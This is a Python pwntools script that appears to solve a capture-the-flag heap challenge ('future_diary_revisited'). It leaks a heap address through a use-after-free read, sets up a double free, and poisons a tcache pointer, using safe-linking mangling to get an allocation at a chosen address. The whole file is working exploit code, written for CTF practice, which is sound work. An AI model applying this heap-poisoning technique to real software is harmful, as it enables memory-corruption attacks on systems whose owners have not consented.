from pwn import *
import os
import shlex
import subprocess

context.log_level = "info"


def start():
    wsl_path = subprocess.check_output(["wsl", "wslpath", "-a", os.getcwd()]).decode().strip()
    return process(["wsl", "bash", "-lc", f"cd {shlex.quote(wsl_path)}/extracted && ./future_diary_revisited"])


def create(io, idx, size=0x78, data=b"A"):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"page? ", str(idx).encode())
    io.sendlineafter(b"length? ", str(size).encode())
    io.sendafter(b"content? ", data)
    if len(data) < size:
        io.send(b"\n")


def delete(io, idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"page? ", str(idx).encode())


def dump(io, idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"page? ", str(idx).encode())
    return io.recvline(keepends=False)


for attempt in range(20):
    io = start()
    for i in range(1, 10):
        create(io, i, data=bytes([0x40 + i]))
    delete(io, 1)
    heap_page = u64(dump(io, 1).ljust(8, b"\0"))
    p1 = (heap_page << 12) + 0x2a0
    a_addr = p1 + (8 - 1) * 0x80
    target = (p1 + 0x2000) & ~0xf
    log.info("attempt=%d p1=%#x A=%#x target=%#x", attempt, p1, a_addr, target)
    for i in range(2, 8):
        delete(io, i)
    delete(io, 8)
    delete(io, 9)
    delete(io, 8)
    for i in range(10, 16):
        create(io, i)
    poison = p64(target ^ (a_addr >> 12))
    if b"\n" in poison:
        io.close()
        continue
    create(io, 16, data=poison)
    create(io, 17, data=b"B")
    create(io, 18, data=b"C")
    create(io, 40, data=b"TARGETOK")
    log.info("made page40")
    io.sendlineafter(b"> ", b"4")
    print(io.recvall(timeout=1))
    break
